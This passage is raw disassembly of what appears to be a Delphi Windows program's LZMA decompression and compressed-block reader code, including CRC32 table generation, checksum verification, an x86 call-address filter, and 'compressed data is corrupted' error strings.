  407589:	28 40 00             	sub    %al,0x0(%eax)
  40758c:	d4 28                	aam    $0x28
  40758e:	40                   	inc    %eax
  40758f:	00 18                	add    %bl,(%eax)
  407591:	29 40 00             	sub    %eax,0x0(%eax)
  407594:	16                   	push   %ss
  407595:	45                   	inc    %ebp
  407596:	43                   	inc    %ebx
  407597:	6f                   	outsl  %ds:(%esi),(%dx)
  407598:	6d                   	insl   (%dx),%es:(%edi)
  407599:	70 72                	jo     0x40760d
  40759b:	65 73 73             	gs jae 0x407611
  40759e:	49                   	dec    %ecx
  40759f:	6e                   	outsb  %ds:(%esi),(%dx)
  4075a0:	74 65                	je     0x407607
  4075a2:	72 6e                	jb     0x407612
  4075a4:	61                   	popa
  4075a5:	6c                   	insb   (%dx),%es:(%edi)
  4075a6:	45                   	inc    %ebp
  4075a7:	72 72                	jb     0x40761b
  4075a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4075aa:	72 90                	jb     0x40753c
	...
  4075c4:	ec                   	in     (%dx),%al
  4075c5:	75 40                	jne    0x407607
  4075c7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075ca:	00 00                	add    %al,(%eax)
  4075cc:	3c 10                	cmp    $0x10,%al
  4075ce:	40                   	inc    %eax
  4075cf:	00 c4                	add    %al,%ah
  4075d1:	29 40 00             	sub    %eax,0x0(%eax)
  4075d4:	ac                   	lods   %ds:(%esi),%al
  4075d5:	28 40 00             	sub    %al,0x0(%eax)
  4075d8:	d4 28                	aam    $0x28
  4075da:	40                   	inc    %eax
  4075db:	00 18                	add    %bl,(%eax)
  4075dd:	29 40 00             	sub    %eax,0x0(%eax)
  4075e0:	40                   	inc    %eax
  4075e1:	77 40                	ja     0x407623
  4075e3:	00 00                	add    %al,(%eax)
  4075e5:	76 40                	jbe    0x407627
  4075e7:	00 08                	add    %cl,(%eax)
  4075e9:	76 40                	jbe    0x40762b
  4075eb:	00 13                	add    %dl,(%ebx)
  4075ed:	54                   	push   %esp
  4075ee:	43                   	inc    %ebx
  4075ef:	75 73                	jne    0x407664
  4075f1:	74 6f                	je     0x407662
  4075f3:	6d                   	insl   (%dx),%es:(%edi)
  4075f4:	44                   	inc    %esp
  4075f5:	65 63 6f 6d          	arpl   %ebp,%gs:0x6d(%edi)
  4075f9:	70 72                	jo     0x40766d
  4075fb:	65 73 73             	gs jae 0x407671
  4075fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ff:	72 e9                	jb     0x4075ea
  407601:	fb                   	sti
  407602:	b0 ff                	mov    $0xff,%al
  407604:	ff 8d 40 00 e9 f3    	decl   -0xc16ffc0(%ebp)
  40760a:	b0 ff                	mov    $0xff,%al
  40760c:	ff 8d 40 00 00 00    	decl   0x40(%ebp)
	...
  407626:	00 00                	add    %al,(%eax)
  407628:	44                   	inc    %esp
  407629:	76 40                	jbe    0x40766b
  40762b:	00 1c 10             	add    %bl,(%eax,%edx,1)
  40762e:	00 00                	add    %al,(%eax)
  407630:	3c 10                	cmp    $0x10,%al
  407632:	40                   	inc    %eax
  407633:	00 c4                	add    %al,%ah
  407635:	29 40 00             	sub    %eax,0x0(%eax)
  407638:	ac                   	lods   %ds:(%esi),%al
  407639:	28 40 00             	sub    %al,0x0(%eax)
  40763c:	d4 28                	aam    $0x28
  40763e:	40                   	inc    %eax
  40763f:	00 b4 78 40 00 16 54 	add    %dh,0x54160040(%eax,%edi,2)
  407646:	43                   	inc    %ebx
  407647:	6f                   	outsl  %ds:(%esi),(%dx)
  407648:	6d                   	insl   (%dx),%es:(%edi)
  407649:	70 72                	jo     0x4076bd
  40764b:	65 73 73             	gs jae 0x4076c1
  40764e:	65 64 42             	gs fs inc %edx
  407651:	6c                   	insb   (%dx),%es:(%edi)
  407652:	6f                   	outsl  %ds:(%esi),(%dx)
  407653:	63 6b 52             	arpl   %ebp,0x52(%ebx)
  407656:	65 61                	gs popa
  407658:	64 65 72 90          	fs gs jb 0x4075ec
  40765c:	56                   	push   %esi
  40765d:	33 f6                	xor    %esi,%esi
  40765f:	b9 5c b5 40 00       	mov    $0x40b55c,%ecx
  407664:	8b c6                	mov    %esi,%eax
  407666:	ba 08 00 00 00       	mov    $0x8,%edx
  40766b:	a8 01                	test   $0x1,%al
  40766d:	74 09                	je     0x407678
  40766f:	d1 e8                	shr    $1,%eax
  407671:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  407676:	eb 02                	jmp    0x40767a
  407678:	d1 e8                	shr    $1,%eax
  40767a:	4a                   	dec    %edx
  40767b:	75 ee                	jne    0x40766b
  40767d:	89 01                	mov    %eax,(%ecx)
  40767f:	46                   	inc    %esi
  407680:	83 c1 04             	add    $0x4,%ecx
  407683:	81 fe 00 01 00 00    	cmp    $0x100,%esi
  407689:	75 d9                	jne    0x407664
  40768b:	5e                   	pop    %esi
  40768c:	c3                   	ret
  40768d:	8d 40 00             	lea    0x0(%eax),%eax
  407690:	53                   	push   %ebx
  407691:	56                   	push   %esi
  407692:	57                   	push   %edi
  407693:	8b f1                	mov    %ecx,%esi
  407695:	8b fa                	mov    %edx,%edi
  407697:	8b d8                	mov    %eax,%ebx
  407699:	83 3d 58 b5 40 00 00 	cmpl   $0x0,0x40b558
  4076a0:	75 11                	jne    0x4076b3
  4076a2:	e8 b5 ff ff ff       	call   0x40765c
  4076a7:	6a 01                	push   $0x1
  4076a9:	68 58 b5 40 00       	push   $0x40b558
  4076ae:	e8 49 cd ff ff       	call   0x4043fc
  4076b3:	8b c7                	mov    %edi,%eax
  4076b5:	85 f6                	test   %esi,%esi
  4076b7:	74 25                	je     0x4076de
  4076b9:	8b d3                	mov    %ebx,%edx
  4076bb:	66 81 e2 ff 00       	and    $0xff,%dx
  4076c0:	33 c9                	xor    %ecx,%ecx
  4076c2:	8a 08                	mov    (%eax),%cl
  4076c4:	66 33 d1             	xor    %cx,%dx
  4076c7:	0f b7 d2             	movzwl %dx,%edx
  4076ca:	8b 14 95 5c b5 40 00 	mov    0x40b55c(,%edx,4),%edx
  4076d1:	c1 eb 08             	shr    $0x8,%ebx
  4076d4:	33 d3                	xor    %ebx,%edx
  4076d6:	8b da                	mov    %edx,%ebx
  4076d8:	4e                   	dec    %esi
  4076d9:	40                   	inc    %eax
  4076da:	85 f6                	test   %esi,%esi
  4076dc:	75 db                	jne    0x4076b9
  4076de:	8b c3                	mov    %ebx,%eax
  4076e0:	5f                   	pop    %edi
  4076e1:	5e                   	pop    %esi
  4076e2:	5b                   	pop    %ebx
  4076e3:	c3                   	ret
  4076e4:	53                   	push   %ebx
  4076e5:	56                   	push   %esi
  4076e6:	8b f2                	mov    %edx,%esi
  4076e8:	8b d8                	mov    %eax,%ebx
  4076ea:	8b d3                	mov    %ebx,%edx
  4076ec:	8b ce                	mov    %esi,%ecx
  4076ee:	83 c8 ff             	or     $0xffffffff,%eax
  4076f1:	e8 9a ff ff ff       	call   0x407690
  4076f6:	83 f0 ff             	xor    $0xffffffff,%eax
  4076f9:	5e                   	pop    %esi
  4076fa:	5b                   	pop    %ebx
  4076fb:	c3                   	ret
  4076fc:	56                   	push   %esi
  4076fd:	51                   	push   %ecx
  4076fe:	88 0c 24             	mov    %cl,(%esp)
  407701:	83 fa 05             	cmp    $0x5,%edx
  407704:	7c 36                	jl     0x40773c
  407706:	83 ea 04             	sub    $0x4,%edx
  407709:	8b f0                	mov    %eax,%esi
  40770b:	33 c0                	xor    %eax,%eax
  40770d:	3b d0                	cmp    %eax,%edx
  40770f:	7e 2b                	jle    0x40773c
  407711:	8a 0c 06             	mov    (%esi,%eax,1),%cl
  407714:	80 f9 e8             	cmp    $0xe8,%cl
  407717:	74 05                	je     0x40771e
  407719:	80 f9 e9             	cmp    $0xe9,%cl
  40771c:	75 19                	jne    0x407737
  40771e:	83 c0 05             	add    $0x5,%eax
  407721:	80 3c 24 00          	cmpb   $0x0,(%esp)
  407725:	74 08                	je     0x40772f
  407727:	8d 4c 06 fc          	lea    -0x4(%esi,%eax,1),%ecx
  40772b:	01 01                	add    %eax,(%ecx)
  40772d:	eb 09                	jmp    0x407738
  40772f:	8d 4c 06 fc          	lea    -0x4(%esi,%eax,1),%ecx
  407733:	29 01                	sub    %eax,(%ecx)
  407735:	eb 01                	jmp    0x407738
  407737:	40                   	inc    %eax
  407738:	3b d0                	cmp    %eax,%edx
  40773a:	7f d5                	jg     0x407711
  40773c:	5a                   	pop    %edx
  40773d:	5e                   	pop    %esi
  40773e:	c3                   	ret
  40773f:	90                   	nop
  407740:	55                   	push   %ebp
  407741:	8b ec                	mov    %esp,%ebp
  407743:	53                   	push   %ebx
  407744:	56                   	push   %esi
  407745:	84 d2                	test   %dl,%dl
  407747:	74 08                	je     0x407751
  407749:	83 c4 f0             	add    $0xfffffff0,%esp
  40774c:	e8 77 b3 ff ff       	call   0x402ac8
  407751:	8b da                	mov    %edx,%ebx
  407753:	8b f0                	mov    %eax,%esi
  407755:	33 d2                	xor    %edx,%edx
  407757:	8b c6                	mov    %esi,%eax
  407759:	e8 9e b1 ff ff       	call   0x4028fc
  40775e:	8b 45 08             	mov    0x8(%ebp),%eax
  407761:	89 46 04             	mov    %eax,0x4(%esi)
  407764:	8b 45 0c             	mov    0xc(%ebp),%eax
  407767:	89 46 08             	mov    %eax,0x8(%esi)
  40776a:	84 db                	test   %bl,%bl
  40776c:	74 0a                	je     0x407778
  40776e:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  407775:	83 c4 0c             	add    $0xc,%esp
  407778:	8b c6                	mov    %esi,%eax
  40777a:	5e                   	pop    %esi
  40777b:	5b                   	pop    %ebx
  40777c:	5d                   	pop    %ebp
  40777d:	c2 08 00             	ret    $0x8
  407780:	55                   	push   %ebp
  407781:	8b ec                	mov    %esp,%ebp
  407783:	83 c4 e0             	add    $0xffffffe0,%esp
  407786:	53                   	push   %ebx
  407787:	56                   	push   %esi
  407788:	57                   	push   %edi
  407789:	84 d2                	test   %dl,%dl
  40778b:	74 08                	je     0x407795
  40778d:	83 c4 f0             	add    $0xfffffff0,%esp
  407790:	e8 33 b3 ff ff       	call   0x402ac8
  407795:	8b f1                	mov    %ecx,%esi
  407797:	88 55 ff             	mov    %dl,-0x1(%ebp)
  40779a:	8b d8                	mov    %eax,%ebx
  40779c:	33 d2                	xor    %edx,%edx
  40779e:	8b c3                	mov    %ebx,%eax
  4077a0:	e8 57 b1 ff ff       	call   0x4028fc
  4077a5:	89 73 08             	mov    %esi,0x8(%ebx)
  4077a8:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4077ab:	b9 04 00 00 00       	mov    $0x4,%ecx
  4077b0:	8b c6                	mov    %esi,%eax
  4077b2:	8b 38                	mov    (%eax),%edi
  4077b4:	ff 57 08             	call   *0x8(%edi)
  4077b7:	83 f8 04             	cmp    $0x4,%eax
  4077ba:	75 14                	jne    0x4077d0
  4077bc:	8d 55 f0             	lea    -0x10(%ebp),%edx
  4077bf:	b9 05 00 00 00       	mov    $0x5,%ecx
  4077c4:	8b c6                	mov    %esi,%eax
  4077c6:	8b 38                	mov    (%eax),%edi
  4077c8:	ff 57 08             	call   *0x8(%edi)
  4077cb:	83 f8 05             	cmp    $0x5,%eax
  4077ce:	74 16                	je     0x4077e6
  4077d0:	b9 94 78 40 00       	mov    $0x407894,%ecx
  4077d5:	b2 01                	mov    $0x1,%dl
  4077d7:	b8 4c 75 40 00       	mov    $0x40754c,%eax
  4077dc:	e8 ff df ff ff       	call   0x4057e0
  4077e1:	e8 ce b6 ff ff       	call   0x402eb4
  4077e6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4077e9:	ba 05 00 00 00       	mov    $0x5,%edx
  4077ee:	e8 f1 fe ff ff       	call   0x4076e4
  4077f3:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  4077f6:	74 16                	je     0x40780e
  4077f8:	b9 94 78 40 00       	mov    $0x407894,%ecx
  4077fd:	b2 01                	mov    $0x1,%dl
  4077ff:	b8 4c 75 40 00       	mov    $0x40754c,%eax
  407804:	e8 d7 df ff ff       	call   0x4057e0
  407809:	e8 a6 b6 ff ff       	call   0x402eb4
  40780e:	8d 55 e8             	lea    -0x18(%ebp),%edx
  407811:	8b c6                	mov    %esi,%eax
  407813:	8b 08                	mov    (%eax),%ecx
  407815:	ff 11                	call   *(%ecx)
  407817:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40781a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40781d:	e8 6a ed ff ff       	call   0x40658c
  407822:	8d 55 e0             	lea    -0x20(%ebp),%edx
  407825:	8b c6                	mov    %esi,%eax
  407827:	8b 08                	mov    (%eax),%ecx
  407829:	ff 51 04             	call   *0x4(%ecx)
  40782c:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40782f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407832:	e8 35 ed ff ff       	call   0x40656c
  407837:	85 c0                	test   %eax,%eax
  407839:	7e 16                	jle    0x407851
  40783b:	b9 94 78 40 00       	mov    $0x407894,%ecx
  407840:	b2 01                	mov    $0x1,%dl
  407842:	b8 4c 75 40 00       	mov    $0x40754c,%eax
  407847:	e8 94 df ff ff       	call   0x4057e0
  40784c:	e8 63 b6 ff ff       	call   0x402eb4
  407851:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  407855:	74 10                	je     0x407867
  407857:	53                   	push   %ebx
  407858:	68 b4 79 40 00       	push   $0x4079b4
  40785d:	b2 01                	mov    $0x1,%dl
  40785f:	8b 45 08             	mov    0x8(%ebp),%eax
  407862:	ff 10                	call   *(%eax)
  407864:	89 43 04             	mov    %eax,0x4(%ebx)
  407867:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40786a:	89 43 0c             	mov    %eax,0xc(%ebx)
  40786d:	c6 43 10 01          	movb   $0x1,0x10(%ebx)
  407871:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  407875:	74 0a                	je     0x407881
  407877:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  40787e:	83 c4 0c             	add    $0xc,%esp
  407881:	8b c3                	mov    %ebx,%eax
  407883:	5f                   	pop    %edi
  407884:	5e                   	pop    %esi
  407885:	5b                   	pop    %ebx
  407886:	8b e5                	mov    %ebp,%esp
  407888:	5d                   	pop    %ebp
  407889:	c2 04 00             	ret    $0x4
  40788c:	ff                   	(bad)
  40788d:	ff                   	(bad)
  40788e:	ff                   	(bad)
  40788f:	ff 1d 00 00 00 43    	lcall  *0x43000000
  407895:	6f                   	outsl  %ds:(%esi),(%dx)
  407896:	6d                   	insl   (%dx),%es:(%edi)
  407897:	70 72                	jo     0x40790b
  407899:	65 73 73             	gs jae 0x40790f
  40789c:	65 64 20 62 6c       	gs and %ah,%fs:0x6c(%edx)
  4078a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a2:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  4078a5:	69 73 20 63 6f 72 72 	imul   $0x72726f63,0x20(%ebx),%esi
  4078ac:	75 70                	jne    0x40791e
  4078ae:	74 65                	je     0x407915
  4078b0:	64 00 00             	add    %al,%fs:(%eax)
  4078b3:	00 53 56             	add    %dl,0x56(%ebx)
  4078b6:	83 c4 f8             	add    $0xfffffff8,%esp
  4078b9:	8b da                	mov    %edx,%ebx
  4078bb:	8b f0                	mov    %eax,%esi
  4078bd:	8b 46 04             	mov    0x4(%esi),%eax
  4078c0:	e8 5f b0 ff ff       	call   0x402924
  4078c5:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  4078c9:	74 1d                	je     0x4078e8
  4078cb:	8b d4                	mov    %esp,%edx
  4078cd:	8b 46 08             	mov    0x8(%esi),%eax
  4078d0:	8b 08                	mov    (%eax),%ecx
  4078d2:	ff 11                	call   *(%ecx)
  4078d4:	8b c4                	mov    %esp,%eax
  4078d6:	8b 56 0c             	mov    0xc(%esi),%edx
  4078d9:	e8 ae ec ff ff       	call   0x40658c
  4078de:	8b d4                	mov    %esp,%edx
  4078e0:	8b 46 08             	mov    0x8(%esi),%eax
  4078e3:	8b 08                	mov    (%eax),%ecx
  4078e5:	ff 51 0c             	call   *0xc(%ecx)
  4078e8:	33 d2                	xor    %edx,%edx
  4078ea:	8b c6                	mov    %esi,%eax
  4078ec:	e8 27 b0 ff ff       	call   0x402918
  4078f1:	84 db                	test   %bl,%bl
  4078f3:	74 07                	je     0x4078fc
  4078f5:	8b c6                	mov    %esi,%eax
  4078f7:	e8 08 b2 ff ff       	call   0x402b04
  4078fc:	8b c6                	mov    %esi,%eax
  4078fe:	59                   	pop    %ecx
  4078ff:	5a                   	pop    %edx
  407900:	5e                   	pop    %esi
  407901:	5b                   	pop    %ebx
  407902:	c3                   	ret
  407903:	90                   	nop
  407904:	53                   	push   %ebx
  407905:	56                   	push   %esi
  407906:	51                   	push   %ecx
  407907:	8b d8                	mov    %eax,%ebx
  407909:	83 7b 0c 05          	cmpl   $0x5,0xc(%ebx)
  40790d:	7d 16                	jge    0x407925
  40790f:	b9 94 79 40 00       	mov    $0x407994,%ecx
  407914:	b2 01                	mov    $0x1,%dl
  407916:	b8 4c 75 40 00       	mov    $0x40754c,%eax
  40791b:	e8 c0 de ff ff       	call   0x4057e0
  407920:	e8 8f b5 ff ff       	call   0x402eb4
  407925:	8b d4                	mov    %esp,%edx
  407927:	b9 04 00 00 00       	mov    $0x4,%ecx
  40792c:	8b 43 08             	mov    0x8(%ebx),%eax
  40792f:	e8 38 f9 ff ff       	call   0x40726c
  407934:	83 6b 0c 04          	subl   $0x4,0xc(%ebx)
  407938:	8b 73 0c             	mov    0xc(%ebx),%esi
  40793b:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  407941:	7e 05                	jle    0x407948
  407943:	be 00 10 00 00       	mov    $0x1000,%esi
  407948:	8d 53 1c             	lea    0x1c(%ebx),%edx
  40794b:	8b ce                	mov    %esi,%ecx
  40794d:	8b 43 08             	mov    0x8(%ebx),%eax
  407950:	e8 17 f9 ff ff       	call   0x40726c
  407955:	29 73 0c             	sub    %esi,0xc(%ebx)
  407958:	33 c0                	xor    %eax,%eax
  40795a:	89 43 14             	mov    %eax,0x14(%ebx)
  40795d:	89 73 18             	mov    %esi,0x18(%ebx)
  407960:	8d 43 1c             	lea    0x1c(%ebx),%eax
  407963:	8b d6                	mov    %esi,%edx
  407965:	e8 7a fd ff ff       	call   0x4076e4
  40796a:	3b 04 24             	cmp    (%esp),%eax
  40796d:	74 16                	je     0x407985
  40796f:	b9 94 79 40 00       	mov    $0x407994,%ecx
  407974:	b2 01                	mov    $0x1,%dl
  407976:	b8 4c 75 40 00       	mov    $0x40754c,%eax
  40797b:	e8 60 de ff ff       	call   0x4057e0
  407980:	e8 2f b5 ff ff       	call   0x402eb4
  407985:	5a                   	pop    %edx
  407986:	5e                   	pop    %esi
  407987:	5b                   	pop    %ebx
  407988:	c3                   	ret
  407989:	00 00                	add    %al,(%eax)
  40798b:	00 ff                	add    %bh,%bh
  40798d:	ff                   	(bad)
  40798e:	ff                   	(bad)
  40798f:	ff 1d 00 00 00 43    	lcall  *0x43000000
  407995:	6f                   	outsl  %ds:(%esi),(%dx)
  407996:	6d                   	insl   (%dx),%es:(%edi)
  407997:	70 72                	jo     0x407a0b
  407999:	65 73 73             	gs jae 0x407a0f
  40799c:	65 64 20 62 6c       	gs and %ah,%fs:0x6c(%edx)
  4079a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4079a2:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  4079a5:	69 73 20 63 6f 72 72 	imul   $0x72726f63,0x20(%ebx),%esi
  4079ac:	75 70                	jne    0x407a1e
  4079ae:	74 65                	je     0x407a15
  4079b0:	64 00 00             	add    %al,%fs:(%eax)
  4079b3:	00 53 56             	add    %dl,0x56(%ebx)
  4079b6:	57                   	push   %edi
  4079b7:	55                   	push   %ebp
  4079b8:	51                   	push   %ecx
  4079b9:	8b f9                	mov    %ecx,%edi
  4079bb:	8b f0                	mov    %eax,%esi
  4079bd:	33 c0                	xor    %eax,%eax
  4079bf:	89 04 24             	mov    %eax,(%esp)
  4079c2:	8b ea                	mov    %edx,%ebp
  4079c4:	85 ff                	test   %edi,%edi
  4079c6:	7e 3f                	jle    0x407a07
  4079c8:	83 7e 18 00          	cmpl   $0x0,0x18(%esi)
  4079cc:	75 0d                	jne    0x4079db
  4079ce:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  4079d2:	74 33                	je     0x407a07
  4079d4:	8b c6                	mov    %esi,%eax
  4079d6:	e8 29 ff ff ff       	call   0x407904
  4079db:	8b df                	mov    %edi,%ebx
  4079dd:	8b 46 18             	mov    0x18(%esi),%eax
  4079e0:	3b d8                	cmp    %eax,%ebx
  4079e2:	76 02                	jbe    0x4079e6
  4079e4:	8b d8                	mov    %eax,%ebx
  4079e6:	8b d5                	mov    %ebp,%edx
  4079e8:	8b 46 14             	mov    0x14(%esi),%eax
  4079eb:	8d 44 06 1c          	lea    0x1c(%esi,%eax,1),%eax
  4079ef:	8b cb                	mov    %ebx,%ecx
  4079f1:	e8 8e ac ff ff       	call   0x402684
  4079f6:	01 5e 14             	add    %ebx,0x14(%esi)
  4079f9:	29 5e 18             	sub    %ebx,0x18(%esi)
  4079fc:	03 eb                	add    %ebx,%ebp
  4079fe:	2b fb                	sub    %ebx,%edi
  407a00:	01 1c 24             	add    %ebx,(%esp)
  407a03:	85 ff                	test   %edi,%edi
  407a05:	7f c1                	jg     0x4079c8
  407a07:	8b 04 24             	mov    (%esp),%eax
  407a0a:	5a                   	pop    %edx
  407a0b:	5d                   	pop    %ebp
  407a0c:	5f                   	pop    %edi
  407a0d:	5e                   	pop    %esi
  407a0e:	5b                   	pop    %ebx
  407a0f:	c3                   	ret
  407a10:	53                   	push   %ebx
  407a11:	56                   	push   %esi
  407a12:	57                   	push   %edi
  407a13:	8b f1                	mov    %ecx,%esi
  407a15:	8b fa                	mov    %edx,%edi
  407a17:	8b d8                	mov    %eax,%ebx
  407a19:	8b 43 04             	mov    0x4(%ebx),%eax
  407a1c:	85 c0                	test   %eax,%eax
  407a1e:	74 0b                	je     0x407a2b
  407a20:	8b d7                	mov    %edi,%edx
  407a22:	8b ce                	mov    %esi,%ecx
  407a24:	8b 18                	mov    (%eax),%ebx
  407a26:	ff 53 04             	call   *0x4(%ebx)
  407a29:	eb 25                	jmp    0x407a50
  407a2b:	8b d7                	mov    %edi,%edx
  407a2d:	8b ce                	mov    %esi,%ecx
  407a2f:	8b c3                	mov    %ebx,%eax
  407a31:	e8 7e ff ff ff       	call   0x4079b4
  407a36:	3b f0                	cmp    %eax,%esi
  407a38:	74 16                	je     0x407a50
  407a3a:	b9 5c 7a 40 00       	mov    $0x407a5c,%ecx
  407a3f:	b2 01                	mov    $0x1,%dl
  407a41:	b8 4c 75 40 00       	mov    $0x40754c,%eax
  407a46:	e8 95 dd ff ff       	call   0x4057e0
  407a4b:	e8 64 b4 ff ff       	call   0x402eb4
  407a50:	5f                   	pop    %edi
  407a51:	5e                   	pop    %esi
  407a52:	5b                   	pop    %ebx
  407a53:	c3                   	ret
  407a54:	ff                   	(bad)
  407a55:	ff                   	(bad)
  407a56:	ff                   	(bad)
  407a57:	ff 1d 00 00 00 43    	lcall  *0x43000000
  407a5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a5e:	6d                   	insl   (%dx),%es:(%edi)
  407a5f:	70 72                	jo     0x407ad3
  407a61:	65 73 73             	gs jae 0x407ad7
  407a64:	65 64 20 62 6c       	gs and %ah,%fs:0x6c(%edx)
  407a69:	6f                   	outsl  %ds:(%esi),(%dx)
  407a6a:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  407a6d:	69 73 20 63 6f 72 72 	imul   $0x72726f63,0x20(%ebx),%esi
  407a74:	75 70                	jne    0x407ae6
  407a76:	74 65                	je     0x407add
  407a78:	64 00 00             	add    %al,%fs:(%eax)
	...
  407a93:	00 bc 7a 40 00 68 00 	add    %bh,0x680040(%edx,%edi,2)
  407a9a:	01 00                	add    %eax,(%eax)
  407a9c:	e0 75                	loopne 0x407b13
  407a9e:	40                   	inc    %eax
  407a9f:	00 c4                	add    %al,%ah
  407aa1:	29 40 00             	sub    %eax,0x0(%eax)
  407aa4:	ac                   	lods   %ds:(%esi),%al
  407aa5:	28 40 00             	sub    %al,0x0(%eax)
  407aa8:	d4 28                	aam    $0x28
  407aaa:	40                   	inc    %eax
  407aab:	00 b0 7b 40 00 40    	add    %dh,0x4000407b(%eax)
  407ab1:	77 40                	ja     0x407af3
  407ab3:	00 f4                	add    %dh,%ah
  407ab5:	7c 40                	jl     0x407af7
  407ab7:	00 d0                	add    %dl,%al
  407ab9:	7d 40                	jge    0x407afb
  407abb:	00 11                	add    %dl,(%ecx)
  407abd:	54                   	push   %esp
  407abe:	4c                   	dec    %esp
  407abf:	5a                   	pop    %edx
  407ac0:	4d                   	dec    %ebp
  407ac1:	41                   	inc    %ecx
  407ac2:	44                   	inc    %esp
  407ac3:	65 63 6f 6d          	arpl   %ebp,%gs:0x6d(%edi)
  407ac7:	70 72                	jo     0x407b3b
  407ac9:	65 73 73             	gs jae 0x407b3f
  407acc:	6f                   	outsl  %ds:(%esi),(%dx)
  407acd:	72 8b                	jb     0x407a5a
  407acf:	c0 55 8b ec          	rclb   $0xec,-0x75(%ebp)
  407ad3:	6a 00                	push   $0x0
  407ad5:	53                   	push   %ebx
  407ad6:	56                   	push   %esi
  407ad7:	57                   	push   %edi
  407ad8:	8b d8                	mov    %eax,%ebx
  407ada:	33 c0                	xor    %eax,%eax
  407adc:	55                   	push   %ebp
  407add:	68 29 7b 40 00       	push   $0x407b29
  407ae2:	64 ff 30             	push   %fs:(%eax)
  407ae5:	64 89 20             	mov    %esp,%fs:(%eax)
  407ae8:	ba 40 7b 40 00       	mov    $0x407b40,%edx
  407aed:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407af0:	e8 37 b7 ff ff       	call   0x40322c
  407af5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407af8:	8b d3                	mov    %ebx,%edx
  407afa:	e8 fd b7 ff ff       	call   0x4032fc
  407aff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407b02:	b2 01                	mov    $0x1,%dl
  407b04:	b8 94 75 40 00       	mov    $0x407594,%eax
  407b09:	e8 d2 dc ff ff       	call   0x4057e0
  407b0e:	e8 a1 b3 ff ff       	call   0x402eb4
  407b13:	33 c0                	xor    %eax,%eax
  407b15:	5a                   	pop    %edx
  407b16:	59                   	pop    %ecx
  407b17:	59                   	pop    %ecx
  407b18:	64 89 10             	mov    %edx,%fs:(%eax)
  407b1b:	68 30 7b 40 00       	push   $0x407b30
  407b20:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407b23:	e8 70 b6 ff ff       	call   0x403198
  407b28:	c3                   	ret
  407b29:	e9 ce b2 ff ff       	jmp    0x402dfc
  407b2e:	eb f0                	jmp    0x407b20
  407b30:	5f                   	pop    %edi
  407b31:	5e                   	pop    %esi
  407b32:	5b                   	pop    %ebx
  407b33:	59                   	pop    %ecx
  407b34:	5d                   	pop    %ebp
  407b35:	c3                   	ret
  407b36:	00 00                	add    %al,(%eax)
  407b38:	ff                   	(bad)
  407b39:	ff                   	(bad)
  407b3a:	ff                   	(bad)
  407b3b:	ff 06                	incl   (%esi)
  407b3d:	00 00                	add    %al,(%eax)
  407b3f:	00 6c 7a 6d          	add    %ch,0x6d(%edx,%edi,2)
  407b43:	61                   	popa
  407b44:	3a 20                	cmp    (%eax),%ah
  407b46:	00 00                	add    %al,(%eax)
  407b48:	53                   	push   %ebx
  407b49:	83 c4 f8             	add    $0xfffffff8,%esp
  407b4c:	8b d8                	mov    %eax,%ebx
  407b4e:	89 1c 24             	mov    %ebx,(%esp)
  407b51:	c6 44 24 04 00       	movb   $0x0,0x4(%esp)
  407b56:	54                   	push   %esp
  407b57:	6a 00                	push   $0x0
  407b59:	b9 7c 7b 40 00       	mov    $0x407b7c,%ecx
  407b5e:	b2 01                	mov    $0x1,%dl
  407b60:	b8 4c 75 40 00       	mov    $0x40754c,%eax
  407b65:	e8 aa dc ff ff       	call   0x405814
  407b6a:	e8 45 b3 ff ff       	call   0x402eb4
  407b6f:	59                   	pop    %ecx
  407b70:	5a                   	pop    %edx
  407b71:	5b                   	pop    %ebx
  407b72:	c3                   	ret
  407b73:	00 ff                	add    %bh,%bh
  407b75:	ff                   	(bad)
  407b76:	ff                   	(bad)
  407b77:	ff 27                	jmp    *(%edi)
  407b79:	00 00                	add    %al,(%eax)
  407b7b:	00 6c 7a 6d          	add    %ch,0x6d(%edx,%edi,2)
  407b7f:	61                   	popa
  407b80:	3a 20                	cmp    (%eax),%ah
  407b82:	43                   	inc    %ebx
  407b83:	6f                   	outsl  %ds:(%esi),(%dx)
  407b84:	6d                   	insl   (%dx),%es:(%edi)
  407b85:	70 72                	jo     0x407bf9
  407b87:	65 73 73             	gs jae 0x407bfd
  407b8a:	65 64 20 64 61 74    	gs and %ah,%fs:0x74(%ecx,%eiz,2)
  407b90:	61                   	popa
  407b91:	20 69 73             	and    %ch,0x73(%ecx)
  407b94:	20 63 6f             	and    %ah,0x6f(%ebx)
  407b97:	72 72                	jb     0x407c0b
  407b99:	75 70                	jne    0x407c0b
  407b9b:	74 65                	je     0x407c02
  407b9d:	64 20 28             	and    %ch,%fs:(%eax)
  407ba0:	25 64 29 00 8b       	and    $0x8b002964,%eax
  407ba5:	40                   	inc    %eax
  407ba6:	04 e8                	add    $0xe8,%al
  407ba8:	50                   	push   %eax
  407ba9:	00 00                	add    %al,(%eax)
  407bab:	00 33                	add    %dh,(%ebx)
  407bad:	c0 c3 90             	rol    $0x90,%bl
  407bb0:	53                   	push   %ebx
  407bb1:	56                   	push   %esi
